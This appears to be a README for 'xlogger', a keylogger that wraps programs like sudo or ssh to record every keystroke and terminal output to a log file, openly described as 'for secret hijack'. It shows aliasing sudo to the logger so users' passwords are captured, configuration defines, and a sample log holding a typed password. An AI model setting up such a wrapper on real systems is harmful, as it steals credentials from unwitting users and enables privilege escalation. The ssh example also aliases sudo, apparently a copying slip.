# xlogger

记录目标程序的所有键盘输入和终端输入输出的日志。

You know, For secret hijack。

```
#define TARGET_PROGRAM "/usr/bin/sudo"
alias sudo='/opt/xlogger'
sudo -s


#define TARGET_PROGRAM "/usr/bin/ssh"
alias sudo='/opt/xlogger'
ssh root@ssh.server.svc.local
```


## 编译

```bash
make
```

## 选项

在 `xlogger.c` 文件中可以修改以下配置：

### 目标程序配置
```c
#define TARGET_PROGRAM "/path/to/your/program"
#define LOG_FILE "/tmp/xlogger.log"
```

例如：
- SSH: `#define TARGET_PROGRAM "/usr/bin/ssh"`
- Sudo: `#define TARGET_PROGRAM "/usr/bin/sudo"`

### 记录控制
```c
static int log_keyboard_input = 1;   // 1=记录键盘输入, 0=不记录
static int log_console_output = 1;   // 1=记录控制台输出, 0=不记录
```

配置示例：
- 只记录输入：`log_keyboard_input = 1; log_console_output = 0;`
- 只记录输出：`log_keyboard_input = 0; log_console_output = 1;`
- 都不记录：`log_keyboard_input = 0; log_console_output = 0;`（程序仍正常运行）

## 日志格式

日志保存在 `xlogger.log` 文件中，格式如下：

```
[2023-12-07 10:30:15] INPUT: username\n
[2023-12-07 10:30:16] OUTPUT: Password: 
[2023-12-07 10:30:20] INPUT: 123456\n
```
